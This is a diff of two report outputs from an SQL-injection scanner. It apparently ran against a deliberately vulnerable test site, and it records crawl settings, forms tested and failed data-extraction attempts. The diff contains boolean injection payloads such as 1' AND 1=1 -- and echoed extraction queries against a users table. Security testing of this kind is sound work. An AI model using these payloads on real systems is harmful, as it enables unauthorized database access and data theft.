@@ -7,7 +7,7 @@
 |                                                                    |
 |  Request Method: POST                                              |
 |                                                                    |
-|  Crawl Depth: 0                                                    |
+|  Crawl Depth: 1                                                    |
 |                                                                    |
 +--------------------------------------------------------------------
 
@@ -23,8 +23,8 @@
 
 === Check: boolean, with: 
 
-       -> ' AND 1=1 --  
-       -> ' AND 1=2 -- 
+       -> 1' AND 1=1 --  
+       -> 1' AND 1=2 -- 
 
 
 === Check: union, with: 
@@ -48,6 +48,18 @@
 
 NO VULNERABILITY FOUND
 
+== Form tested: 
+
+NO VULNERABILITY FOUND
+
+== Form tested: /secured/newuser.php
+
+NO VULNERABILITY FOUND
+
+== Form tested: //acunetix.us8.list-manage.com/subscribe/post?u=d7d847f8382b52d46a6547bcd&id=fbd39501d7
+
+NO VULNERABILITY FOUND
+
 ======================================================================
                            DATA EXTRACTION                            
 ======================================================================
@@ -60,7 +72,7 @@ Error: Table 'acuart.sqlite_master' doesn't exist
 
 ==> COLUMNS
 
-Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sql FROM sqlite_master WHERE name='users' -- ' AND pass='test'' at line 1
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sql FROM sqlite_master  -- ' AND pass='test'' at line 1
 
 ==> FULL DUMP
 
